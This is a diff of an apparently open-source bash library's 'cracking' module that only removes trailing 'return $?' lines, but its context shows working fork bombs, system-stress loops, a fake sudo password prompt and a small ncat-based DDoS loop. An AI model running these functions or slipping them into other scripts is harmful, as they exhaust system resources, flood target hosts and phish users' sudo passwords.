@@ -34,7 +34,6 @@ bl_cracking_endless_loop() {
     while true; do
         :
     done
-    return $?
 }
 alias bl.cracking.fake_sudo_password_attempt=bl_cracking_fake_sudo_password_attempt
 bl_cracking_fake_sudo_password_attempt() {
@@ -53,7 +52,6 @@ bl_cracking_fake_sudo_password_attempt() {
         bl.loging.plain '\nSorry, try again.'
     done
     bl.logging.plain "sudo: $number incorrect password attempts"
-    return $?
 }
 alias bl.cracking.fork_bomb=bl_cracking_fork_bomb
 bl_cracking_fork_bomb() {
@@ -70,7 +68,6 @@ bl_cracking_fork_bomb() {
     '
     bl.cracking.fork_bomb | \
         bl.cracking.fork_bomb &
-    return $?
 }
 alias bl.cracking.grab_sudo_password=bl_cracking_grab_sudo_password
 bl_cracking_grab_sudo_password() {
@@ -124,7 +121,6 @@ bl_cracking_make_simple_ddos_attack() {
         # shellcheck disable=SC1117,SC2028
         echo "GET /$index\r\n\r\n" | ncat lilu "$2" &
     done
-    return $?
 }
 alias bl.cracking.make_system_unattainable=bl_cracking_make_system_unattainable
 bl_cracking_make_system_unattainable() {
@@ -137,7 +133,6 @@ bl_cracking_make_system_unattainable() {
         ```
     '
     nohup bash --login -c bl.cracking.stress_system &>/dev/null &
-    return $?
 }
 alias bl.cracking.stress_system=bl_cracking_stress_system
 bl_cracking_stress_system() {
@@ -152,7 +147,6 @@ bl_cracking_stress_system() {
     for (( index=0; index < "$1"; index++ )); do
         bl.cracking.endless_loop &
     done
-    return $?
 }
 alias bl.cracking.stress_system_with_fork_bomb=bl_cracking_stress_system_with_fork_bomb
 bl_cracking_stress_system_with_fork_bomb() {
@@ -167,7 +161,6 @@ bl_cracking_stress_system_with_fork_bomb() {
     while true; do
         bl.cracking.fork_bomb
     done
-    return $?
 }
 # endregion
 # region vim modline
